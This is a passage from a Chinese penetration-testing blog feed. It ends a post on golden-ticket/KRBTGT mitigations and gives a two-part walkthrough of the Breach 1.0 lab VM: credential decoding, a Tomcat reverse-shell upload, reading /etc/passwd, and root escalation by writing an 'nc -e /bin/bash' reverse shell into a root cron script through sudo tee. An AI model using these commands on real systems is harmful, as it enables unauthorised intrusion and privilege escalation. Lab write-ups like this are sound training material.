Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码</p><p>（2）禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证</p><p>（3）建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法</p><p>（4）一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;关于黄金票据和白银票据的相关知识。&lt;/p&gt;
&lt;h3 id=&quot;原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#原理</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>breach1靶场渗透（二）</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-09-17T05:05:38.000Z</published>
    <updated>2021-09-17T07:31:21.222Z</updated>
    
    <content type="html"><![CDATA[<p>紧接上一回，看看过滤后的记录，找到一条链接：</p><p><a href="https://imgtu.com/i/4KeOTH"><img src="https://z3.ax1x.com/2021/09/17/4KeOTH.png" alt="4KeOTH.png" /></a></p><p>打开网页看看，并不能正确响应，看到地址栏提示不安全？</p><p><a href="https://imgtu.com/i/4Km8AJ"><img src="https://z3.ax1x.com/2021/09/17/4Km8AJ.png" alt="4Km8AJ.png" /></a></p><p>https为何提示不安全？证书过期了么？</p><p>换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的：</p><p><a href="https://imgtu.com/i/4Knhxx"><img src="https://z3.ax1x.com/2021/09/17/4Knhxx.png" alt="4Knhxx.png" /></a></p><p>OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字：</p><p><a href="https://imgtu.com/i/4KuEzq"><img src="https://z3.ax1x.com/2021/09/17/4KuEzq.png" alt="4KuEzq.png" /></a></p><p>尝试解码看看：</p><p><a href="https://imgtu.com/i/4Ku66P"><img src="https://z3.ax1x.com/2021/09/17/4Ku66P.png" alt="4Ku66P.png" /></a></p><p>获取到一组用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure><p>登录看看，一个tomcat的后台：</p><p><a href="https://imgtu.com/i/4KKJhj"><img src="https://z3.ax1x.com/2021/09/17/4KKJhj.png" alt="4KKJhj.png" /></a></p><p>看到文件上传的位置：</p><p><a href="https://imgtu.com/i/4KQWTO"><img src="https://z3.ax1x.com/2021/09/17/4KQWTO.png" alt="4KQWTO.png" /></a></p><p>使用msf生成一个反弹shell的马：</p><p><a href="https://imgtu.com/i/4KlsUS"><img src="https://z3.ax1x.com/2021/09/17/4KlsUS.png" alt="4KlsUS.png" /></a></p><p>同时开启监听：</p><p><a href="https://imgtu.com/i/4Kl4bV"><img src="https://z3.ax1x.com/2021/09/17/4Kl4bV.png" alt="4Kl4bV.png" /></a></p><p>将生成好的文件上传并且访问：</p><p><a href="https://imgtu.com/i/4K1VqP"><img src="https://z3.ax1x.com/2021/09/17/4K1VqP.png" alt="4K1VqP.png" /></a></p><p>回到msf看到shell:</p><p><a href="https://imgtu.com/i/4K1Gq0"><img src="https://z3.ax1x.com/2021/09/17/4K1Gq0.png" alt="4K1Gq0.png" /></a></p><p>尝试获取交互shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4K80D1"><img src="https://z3.ax1x.com/2021/09/17/4K80D1.png" alt="4K80D1.png" /></a></p><p>看看内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a 看到版本是Linux Breach 4.2.0-27-generic</span><br></pre></td></tr></table></figure><p>msf里看看有没有可以利用的漏洞。结果并没有</p><p>那就看看有没有什么敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name </span><br></pre></td></tr></table></figure><p>读取到/etc/passwd文件：</p><p><a href="https://imgtu.com/i/4KJy1e"><img src="https://z3.ax1x.com/2021/09/17/4KJy1e.png" alt="4KJy1e.png" /></a></p><p>逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件</p><p><a href="https://imgtu.com/i/4KtcdI"><img src="https://z3.ax1x.com/2021/09/17/4KtcdI.png" alt="4KtcdI.png" /></a></p><p>打开查看，是数据库的账号密码文件，账号是root,密码是空。</p><p><a href="https://imgtu.com/i/4Kt7es"><img src="https://z3.ax1x.com/2021/09/17/4Kt7es.png" alt="4Kt7es.png" /></a></p><p>连接数据库：</p><p><a href="https://imgtu.com/i/4KNZlD"><img src="https://z3.ax1x.com/2021/09/17/4KNZlD.png" alt="4KNZlD.png" /></a></p><p>在user表内找打了账号，密码信息：</p><p><a href="https://imgtu.com/i/4KN4tx"><img src="https://z3.ax1x.com/2021/09/17/4KN4tx.png" alt="4KN4tx.png" /></a></p><p>对milton的密码解密（哈希值）：</p><p><a href="https://imgtu.com/i/4KUsUI"><img src="https://z3.ax1x.com/2021/09/17/4KUsUI.png" alt="4KUsUI.png" /></a></p><p>切换用户：</p><p><a href="https://imgtu.com/i/4KaQRf"><img src="https://z3.ax1x.com/2021/09/17/4KaQRf.png" alt="4KaQRf.png" /></a></p><p>再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？</p><p>只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。</p><p>[<img src="https://z3.ax1x.com/2021/09/17/4KDmCR.png" alt="4KDmCR.png" />](<a href="https://imgtu.com/i/4KDmCR">https://imgtu.com/i/4KDmCR</a></p><p>尝试切换，确实是密码，看看权限：</p><p><a href="https://imgtu.com/i/4KDwKf"><img src="https://z3.ax1x.com/2021/09/17/4KDwKf.png" alt="4KDwKf.png" /></a></p><p>两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客</p><p>另一个文件tee:</p><p><a href="https://imgtu.com/i/4Ky8VU"><img src="https://z3.ax1x.com/2021/09/17/4Ky8VU.png" alt="4Ky8VU.png" /></a></p><p>如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txt</span><br><span class="line"></span><br><span class="line">cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure><p>随后我们在msf机器开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>等待一段时间：</p><p><a href="https://imgtu.com/i/4KgRz9"><img src="https://z3.ax1x.com/2021/09/17/4KgRz9.png" alt="4KgRz9.png" /></a></p><p><a href="https://imgtu.com/i/4K2iWQ"><img src="https://z3.ax1x.com/2021/09/17/4K2iWQ.png" alt="4K2iWQ.png" /></a></p><p>结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;紧接上一回，看看过滤后的记录，找到一条链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://imgtu.com/i/4KeOTH&quot;&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/09/17/4KeOTH.png&quot; alt=&quot;4KeOTH.png&quot; </summary>
      
    
    
    
    
    <category term="breach 渗透测试" scheme="http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>breach1靶场渗透</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2021-09-16T16:25:49.000Z</published>
    <updated>2021-09-16T16:32:09.171Z</updated>
    
    <content type="html"><![CDATA[<h4 id="靶场搭建"><a class="markdownIt-Anchor" href="#靶场搭建"></a> 靶场搭建</h4><p>下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默认将ip设置为192.168.110.140。</p><h4 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试：</h4><p>因为IP已知，首先对靶场进行端口扫描，借助nmap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.110.140</span><br></pre></td></tr></table></figure><p>扫描后看到结果，所有的端口都是打开状态，因此判断可能是采用了ips，或者waf防护<a href="https://imgtu.com/i/4uCzCD"><img src="https://z3.ax1x.com/2021/09/16/4uCzCD.png" alt="4uCzCD.png" /></a></p><p>尝试在浏览器中访问靶机IP，看到一些没啥用的信息（讲故事）</p><p><a href="https://imgtu.com/i/4uPYPU"><img src="https://z3.ax1x.com/2021/09/16/4uPYPU.png" alt="4uPYPU.png" /></a></p><p>尝试看看源码？也就这样了。看到一段加密过的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4uPWMd"><img src="https://z3.ax1x.com/2021/09/16/4uPWMd.png" alt="4uPWMd.png" /></a></p><p>这段值是64位，根据常见的加密算法的特征，猜测是base64加密。 （md5:32位，sha1：40位）尝试用自动解码工具解码看看，果然是base64，但还是看不懂，难道加了盐？再试一次，能看懂了。</p><p><a href="https://imgtu.com/i/4uihpF"><img src="https://z3.ax1x.com/2021/09/16/4uihpF.png" alt="4uihpF.png" /></a></p><p><a href="https://imgtu.com/i/4uiqk6"><img src="https://z3.ax1x.com/2021/09/16/4uiqk6.png" alt="4uiqk6.png" /></a></p><p>解码出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>猜测是某个用户账号密码</p><p>回到原来的初始页面，点击图片，进入一个类似导航的页面：</p><p><a href="https://imgtu.com/i/4uZLtI"><img src="https://z3.ax1x.com/2021/09/16/4uZLtI.png" alt="4uZLtI.png" /></a></p><p>依次点点看 ，再最后一个链接，进入了一个后台直接看到是什么cms ，后面可以查询看看这个impress cms 有没有什么漏洞</p><p><a href="https://imgtu.com/i/4ue141"><img src="https://z3.ax1x.com/2021/09/16/4ue141.png" alt="4ue141.png" /></a></p><p>用之前的密码试试看？果然进入：</p><p><a href="https://imgtu.com/i/4ueo80"><img src="https://z3.ax1x.com/2021/09/16/4ueo80.png" alt="4ueo80.png" /></a></p><p>先看看cms是不是有什么漏洞。msf打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  impresscms</span><br></pre></td></tr></table></figure><p>有是有就是不知道这里具体的版本：</p><p><a href="https://imgtu.com/i/4umIdH"><img src="https://z3.ax1x.com/2021/09/16/4umIdH.png" alt="4umIdH.png" /></a></p><p>依次尝试，并不行。。。</p><p>继续看看页面上有啥，这里有三个未读邮件，进去看看</p><p><a href="https://imgtu.com/i/4unAyT"><img src="https://z3.ax1x.com/2021/09/16/4unAyT.png" alt="4unAyT.png" /></a></p><p>第三封邮件有信息，在 192.168.110.140/.keystore 位置保存了文件</p><p><a href="https://imgtu.com/i/4unY0e"><img src="https://z3.ax1x.com/2021/09/16/4unY0e.png" alt="4unY0e.png" /></a></p><p>keystore是keytool（jdk里自带）生成的密钥、证书存储的地方，这里有什么关键的信息？可以用keytool提取java里的密钥、证书。不管别的，先下载这个keystore。但是没有密钥口令也没法解开。</p><p>继续寻找密钥，点点点，在View Account内有个一content链接打开看看？</p><p><a href="https://imgtu.com/i/4uu7xP"><img src="https://z3.ax1x.com/2021/09/16/4uu7xP.png" alt="4uu7xP.png" /></a></p><p><a href="https://imgtu.com/i/4uuzPs"><img src="https://z3.ax1x.com/2021/09/16/4uuzPs.png" alt="4uuzPs.png" /></a></p><p>看看提示，有个文件： <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E3%80%82pcap%E6%96%87%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%8E%A9%E6%84%8F%EF%BC%9F%E6%90%9C%E6%90%9C%E7%9C%8B%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AFwireshark%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%EF%BC%8C%E4%B8%8B%E4%BA%86%E5%86%8D%E8%AF%B4%E3%80%82%E7%BB%A7%E7%BB%AD%E7%9C%8B%EF%BC%8C%E7%94%9F%E6%88%90keystore%E9%9C%80%E8%A6%81%E7%9A%84%E5%88%AB%E5%90%8D%EF%BC%8C%E5%AF%86%E9%92%A5%E9%83%BD%E6%98%AF%E2%80%9Ctomcat%E2%80%9D%E3%80%82%E5%9C%A8%E4%B8%8B%E8%BD%BDkeystore%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E4%BD%BF%E7%94%A8keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%EF%BC%9A">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap。pcap文件？什么玩意？搜搜看，原来是wireshark的流量包，下了再说。继续看，生成keystore需要的别名，密钥都是“tomcat”。在下载keystore的目录下，使用keytool生成证书：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore E:\Download\keystore -destkeystore E:\Download\\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat</span><br></pre></td></tr></table></figure><p>密钥库口令就是tomcat。可以看到tomcat.p12证书生成。</p><p>打开SSL_test_phase1.pcap文件，https协议，用了TSL加密，因此导入刚刚生成的证书来解密。</p><p>编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;edit</p><p><a href="https://imgtu.com/i/4ulPMt"><img src="https://z3.ax1x.com/2021/09/17/4ulPMt.png" alt="4ulPMt.png" /></a></p><p>回到wireshark主页面，过滤一下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4ulGoF"><img src="https://z3.ax1x.com/2021/09/17/4ulGoF.png" alt="4ulGoF.png" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;靶场搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#靶场搭建&quot;&gt;&lt;/a&gt; 靶场搭建&lt;/h4&gt;
&lt;p&gt;下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默</summary>
      
    
    
    
    
    <category term="breach1.0 渗透测试" scheme="http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>myfirstblog</title>
    <link href="http://example.com/2021/09/15/myfirstblog/"/>
    <id>http://example.com/2021/09/15/myfirstblog/</id>
    <published>2021-09-15T12:00:35.000Z</published>
    <updated>2021-09-16T16:21:24.360Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客，分享渗透测试学习的点点滴滴</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客，分享渗透测试学习的点点滴滴&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
